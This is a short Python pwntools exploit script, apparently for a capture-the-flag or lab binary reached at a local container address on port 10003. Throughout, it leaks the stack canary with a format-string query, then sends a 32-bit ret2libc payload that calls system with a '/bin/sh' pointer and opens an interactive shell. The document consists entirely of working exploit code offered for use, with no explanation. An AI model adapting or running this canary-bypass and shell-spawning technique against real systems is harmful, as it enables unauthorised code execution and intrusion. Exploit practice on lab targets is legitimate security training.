from pwn import process, remote
import struct
import sys

#target = process("./three.o")
target = remote("172.17.0.2", 10003)

target.recvline()

message = target.recvline().decode("utf-8").split()
system = int(message[2].strip(','), 16)
binsh = int(message[5], 16)

target.recvuntil("query:")
target.sendline(b'%3$#x ')

canary = int(target.recvuntil("payload:").decode("utf-8").split()[0], 16)

ret = 0xffffffff

buffer = b'\x41' * 8
padding = b'\x41' * 4
payload = buffer + struct.pack("<L", canary) + padding + struct.pack("<L", system) + struct.pack("<L", ret) + struct.pack("<L", binsh)

target.sendline(payload)
target.interactive()
